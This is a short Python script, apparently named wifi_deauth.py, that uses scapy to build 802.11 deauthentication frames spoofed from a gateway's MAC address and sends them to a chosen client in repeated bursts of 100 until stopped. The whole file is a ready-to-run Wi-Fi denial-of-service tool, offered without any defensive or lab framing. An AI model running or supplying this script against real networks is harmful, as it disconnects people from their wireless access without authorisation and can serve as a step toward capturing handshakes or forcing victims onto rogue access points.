import time
import os
from scapy.all import *
import sys

# Function to send deauthentication packet
def deauth(target_mac, gateway_mac, interface):
    # Craft the Deauth packet
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth()
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=True)
    print(f"Sent deauthentication packets to {target_mac} from {gateway_mac}.")

# Monitor mode detection
def check_monitor_mode(interface):
    if "mon" not in interface:
        print(f"[ERROR] {interface} is not in monitor mode. Please set it to monitor mode.")
        sys.exit(1)

# Get network interfaces in monitor mode
def get_monitor_interfaces():
    interfaces = os.popen("iw dev").read()
    if "Interface" not in interfaces:
        print("[ERROR] No network interface found.")
        sys.exit(1)
    return interfaces

# Main function
def main():
    if len(sys.argv) != 4:
        print("Usage: python wifi_deauth.py <Target MAC> <Gateway MAC> <Interface>")
        sys.exit(1)

    target_mac = sys.argv[1]
    gateway_mac = sys.argv[2]
    interface = sys.argv[3]
    
    # Check if the interface is in monitor mode
    check_monitor_mode(interface)
    
    print("Starting the deauthentication attack...")
    while True:
        try:
            deauth(target_mac, gateway_mac, interface)
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n[INFO] Deauthentication attack stopped.")
            break

if __name__ == "__main__":
    main()
